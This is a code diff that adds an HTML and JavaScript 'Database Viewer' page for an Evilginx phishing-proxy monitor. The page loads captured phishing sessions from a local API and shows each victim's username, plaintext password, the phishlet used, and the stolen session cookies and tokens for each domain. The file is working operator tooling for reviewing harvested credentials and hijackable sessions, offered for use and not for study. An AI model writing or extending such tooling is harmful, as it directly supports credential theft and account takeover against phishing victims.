@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Database Viewer - Evilginx Monitor</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+        
+        .glass-card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+        }
+        
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        h1 {
+            color: white;
+            font-size: 28px;
+        }
+        
+        .back-btn {
+            padding: 10px 20px;
+            background: rgba(255, 255, 255, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 10px;
+            color: white;
+            text-decoration: none;
+            font-weight: 600;
+            transition: all 0.3s;
+        }
+        
+        .back-btn:hover {
+            background: rgba(255, 255, 255, 0.3);
+            transform: translateY(-2px);
+        }
+        
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .stat-card {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .stat-label {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 12px;
+            margin-bottom: 5px;
+        }
+        
+        .stat-value {
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        
+        thead {
+            background: rgba(255, 255, 255, 0.1);
+        }
+        
+        th {
+            padding: 15px;
+            text-align: left;
+            color: white;
+            font-weight: 600;
+            border-bottom: 2px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        td {
+            padding: 12px 15px;
+            color: rgba(255, 255, 255, 0.9);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        tr:hover {
+            background: rgba(255, 255, 255, 0.05);
+        }
+        
+        .session-id {
+            font-weight: bold;
+            color: #ffd700;
+        }
+        
+        .expand-btn {
+            background: rgba(102, 126, 234, 0.3);
+            border: 1px solid rgba(102, 126, 234, 0.5);
+            border-radius: 5px;
+            color: white;
+            padding: 5px 10px;
+            cursor: pointer;
+            font-size: 12px;
+        }
+        
+        .expand-btn:hover {
+            background: rgba(102, 126, 234, 0.4);
+        }
+        
+        .details-panel {
+            display: none;
+            margin-top: 10px;
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .details-panel.active {
+            display: block;
+        }
+        
+        .domain-section {
+            margin-bottom: 20px;
+        }
+        
+        .domain-title {
+            color: #ffd700;
+            font-weight: bold;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+        
+        .cookie-item {
+            padding: 8px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 5px;
+            margin-bottom: 5px;
+            font-size: 12px;
+        }
+        
+        .cookie-name {
+            color: #4ade80;
+            font-weight: bold;
+        }
+        
+        .cookie-value {
+            color: rgba(255, 255, 255, 0.7);
+            word-break: break-all;
+            font-size: 11px;
+            margin-top: 3px;
+        }
+        
+        .loading {
+            text-align: center;
+            color: white;
+            padding: 40px;
+            font-size: 18px;
+        }
+        
+        .error {
+            background: rgba(239, 68, 68, 0.2);
+            border: 1px solid rgba(239, 68, 68, 0.5);
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="glass-card">
+            <div class="header">
+                <h1>📊 Database Viewer</h1>
+                <a href="/" class="back-btn">← Back to Dashboard</a>
+            </div>
+            
+            <div id="error" class="error" style="display: none;"></div>
+            
+            <div class="stats" id="stats" style="display: none;">
+                <div class="stat-card">
+                    <div class="stat-label">Total Entries</div>
+                    <div class="stat-value" id="total-entries">0</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-label">Unique Sessions</div>
+                    <div class="stat-value" id="unique-sessions">0</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-label">Total Cookies</div>
+                    <div class="stat-value" id="total-cookies">0</div>
+                </div>
+            </div>
+            
+            <div id="loading" class="loading">Loading database data...</div>
+            
+            <div id="table-container" style="display: none;">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Session ID</th>
+                            <th>Update Time</th>
+                            <th>Username</th>
+                            <th>Phishlet</th>
+                            <th>Tokens</th>
+                            <th>HTTP Tokens</th>
+                            <th>Body Tokens</th>
+                            <th>Total Cookies</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody id="table-body">
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        let allSessions = [];
+        let expandedRows = new Set();
+        
+        async function loadDatabase() {
+            try {
+                const response = await fetch('/api/database/raw');
+                const data = await response.json();
+                
+                if (response.ok) {
+                    allSessions = data.sessions;
+                    displayStats(data);
+                    displayTable(data.sessions);
+                    document.getElementById('loading').style.display = 'none';
+                    document.getElementById('table-container').style.display = 'block';
+                } else {
+                    showError(data.error || 'Failed to load database');
+                }
+            } catch (error) {
+                showError('Error loading database: ' + error.message);
+            }
+        }
+        
+        function displayStats(data) {
+            const uniqueSessions = new Set(data.sessions.map(s => s.id));
+            const totalCookies = data.sessions.reduce((sum, s) => sum + s.total_cookies, 0);
+            
+            document.getElementById('total-entries').textContent = data.total_entries;
+            document.getElementById('unique-sessions').textContent = uniqueSessions.size;
+            document.getElementById('total-cookies').textContent = totalCookies;
+            document.getElementById('stats').style.display = 'grid';
+        }
+        
+        function displayTable(sessions) {
+            const tbody = document.getElementById('table-body');
+            tbody.innerHTML = '';
+            
+            sessions.forEach((session, index) => {
+                const row = document.createElement('tr');
+                row.id = `row-${index}`;
+                
+                const updateTime = session.update_time 
+                    ? new Date(session.update_time * 1000).toLocaleString() 
+                    : 'N/A';
+                
+                row.innerHTML = `
+                    <td class="session-id">${session.id || 'N/A'}</td>
+                    <td>${updateTime}</td>
+                    <td>${session.username || ''}</td>
+                    <td>${session.phishlet || ''}</td>
+                    <td>${session.tokens_count || 0}</td>
+                    <td>${session.http_tokens_count || 0}</td>
+                    <td>${session.body_tokens_count || 0}</td>
+                    <td><strong>${session.total_cookies || 0}</strong></td>
+                    <td>
+                        <button class="expand-btn" onclick="toggleDetails(${index})">
+                            ${expandedRows.has(index) ? '▼ Hide' : '▶ Show'} Details
+                        </button>
+                    </td>
+                `;
+                
+                tbody.appendChild(row);
+                
+                // Add details row
+                const detailsRow = document.createElement('tr');
+                detailsRow.id = `details-${index}`;
+                detailsRow.innerHTML = `
+                    <td colspan="9">
+                        <div class="details-panel" id="panel-${index}">
+                            ${renderSessionDetails(session)}
+                        </div>
+                    </td>
+                `;
+                tbody.appendChild(detailsRow);
+            });
+        }
+        
+        function renderSessionDetails(session) {
+            let html = '<div style="color: white;"><strong>Session Details:</strong></div>';
+            html += `<div style="margin-top: 10px; color: rgba(255,255,255,0.8);">Session ID: ${session.id}</div>`;
+            html += `<div style="color: rgba(255,255,255,0.8);">Username: ${session.username || 'N/A'}</div>`;
+            html += `<div style="color: rgba(255,255,255,0.8);">Password: ${session.password || 'N/A'}</div>`;
+            html += `<div style="color: rgba(255,255,255,0.8);">Phishlet: ${session.phishlet || 'N/A'}</div>`;
+            
+            // Render tokens
+            if (session.tokens_detail && Object.keys(session.tokens_detail).length > 0) {
+                html += '<div class="domain-section"><div class="domain-title">TOKENS:</div>';
+                for (const [domain, cookies] of Object.entries(session.tokens_detail)) {
+                    html += `<div style="margin-left: 20px; margin-bottom: 10px;">`;
+                    html += `<div style="color: #60a5fa; font-weight: bold;">Domain: ${domain}</div>`;
+                    for (const [cookieName, cookieData] of Object.entries(cookies)) {
+                        html += `<div class="cookie-item">`;
+                        html += `<div class="cookie-name">${cookieName}</div>`;
+                        html += `<div class="cookie-value">Value: ${(cookieData.Value || cookieData.value || 'N/A').substring(0, 100)}${(cookieData.Value || cookieData.value || '').length > 100 ? '...' : ''}</div>`;
+                        html += `<div style="color: rgba(255,255,255,0.6); font-size: 10px;">Path: ${cookieData.Path || cookieData.path || '/'}, HttpOnly: ${cookieData.HttpOnly || cookieData.httpOnly || false}</div>`;
+                        html += `</div>`;
+                    }
+                    html += `</div>`;
+                }
+                html += '</div>';
+            }
+            
+            // Render http_tokens
+            if (session.http_tokens_detail && Object.keys(session.http_tokens_detail).length > 0) {
+                html += '<div class="domain-section"><div class="domain-title">HTTP_TOKENS:</div>';
+                for (const [domain, cookies] of Object.entries(session.http_tokens_detail)) {
+                    html += `<div style="margin-left: 20px; margin-bottom: 10px;">`;
+                    html += `<div style="color: #60a5fa; font-weight: bold;">Domain: ${domain}</div>`;
+                    for (const [cookieName, cookieData] of Object.entries(cookies)) {
+                        html += `<div class="cookie-item">`;
+                        html += `<div class="cookie-name">${cookieName}</div>`;
+                        html += `<div class="cookie-value">Value: ${(cookieData.Value || cookieData.value || 'N/A').substring(0, 100)}${(cookieData.Value || cookieData.value || '').length > 100 ? '...' : ''}</div>`;
+                        html += `</div>`;
+                    }
+                    html += `</div>`;
+                }
+                html += '</div>';
+            }
+            
+            // Render body_tokens
+            if (session.body_tokens_detail && Object.keys(session.body_tokens_detail).length > 0) {
+                html += '<div class="domain-section"><div class="domain-title">BODY_TOKENS:</div>';
+                for (const [domain, cookies] of Object.entries(session.body_tokens_detail)) {
+                    html += `<div style="margin-left: 20px; margin-bottom: 10px;">`;
+                    html += `<div style="color: #60a5fa; font-weight: bold;">Domain: ${domain}</div>`;
+                    for (const [cookieName, cookieData] of Object.entries(cookies)) {
+                        html += `<div class="cookie-item">`;
+                        html += `<div class="cookie-name">${cookieName}</div>`;
+                        html += `<div class="cookie-value">Value: ${(cookieData.Value || cookieData.value || 'N/A').substring(0, 100)}${(cookieData.Value || cookieData.value || '').length > 100 ? '...' : ''}</div>`;
+                        html += `</div>`;
+                    }
+                    html += `</div>`;
+                }
+                html += '</div>';
+            }
+            
+            return html;
+        }
+        
+        function toggleDetails(index) {
+            const panel = document.getElementById(`panel-${index}`);
+            const btn = event.target;
+            
+            if (expandedRows.has(index)) {
+                expandedRows.delete(index);
+                panel.classList.remove('active');
+                btn.textContent = '▶ Show Details';
+            } else {
+                expandedRows.add(index);
+                panel.classList.add('active');
+                btn.textContent = '▼ Hide Details';
+            }
+        }
+        
+        function showError(message) {
+            const errorDiv = document.getElementById('error');
+            errorDiv.textContent = message;
+            errorDiv.style.display = 'block';
+            document.getElementById('loading').style.display = 'none';
+        }
+        
+        // Load data on page load
+        loadDatabase();
+    </script>
+</body>
+</html>
+
